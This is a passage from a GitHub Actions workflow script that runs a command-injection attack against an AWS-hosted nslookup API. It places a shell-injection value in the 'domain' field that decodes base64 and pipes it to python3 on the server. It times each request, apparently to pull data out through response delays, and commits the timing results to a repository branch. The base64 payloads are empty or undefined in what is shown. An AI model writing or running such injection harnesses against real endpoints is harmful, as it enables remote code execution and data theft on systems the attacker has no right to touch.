          B64_first_half=""
          B64_second_half=""
          B64_ANALYZE=""

          touch calibrate.txt

          run_timed() {
            local name="$1" b64="$2"
            INJECT="x; echo $b64 | base64 -d | python3 #"
            python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
            START=$(date +%s%N)
            curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
              -H "Content-Type: application/json" -d @payload.json
            END=$(date +%s%N)
            MS=$(( (END - START) / 1000000 ))
            echo "$name ${MS}ms" | tee -a calibrate.txt
          }

          run_timed "b2hi_0" "$B64_b2hi_0"
          run_timed "b2hi_2" "$B64_b2hi_2"
          run_timed "b2hi_3" "$B64_b2hi_3"
          run_timed "b2hi_4" "$B64_b2hi_4"
          run_timed "b2hi_5" "$B64_b2hi_5"
          run_timed "b2hi_8" "$B64_b2hi_8"
          run_timed "b2hi_9" "$B64_b2hi_9"
          run_timed "b2hi_12" "$B64_b2hi_12"
          run_timed "b2hi_13" "$B64_b2hi_13"
          run_timed "b2hi_14" "$B64_b2hi_14"
          run_timed "b2hi_15" "$B64_b2hi_15"
          run_timed "first_half" "$B64_first_half"
          run_timed "second_half" "$B64_second_half"

          echo "=== PHASE 2 HI RE-RUN RESULTS ==="
          cat calibrate.txt
          echo "$B64_ANALYZE" | base64 -d | python3

      - name: Commit results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add calibrate.txt
          git commit -m "phase2hi rerun with calibration + half tests [skip ci]" || echo "Nothing to commit"
          git push origin corgi
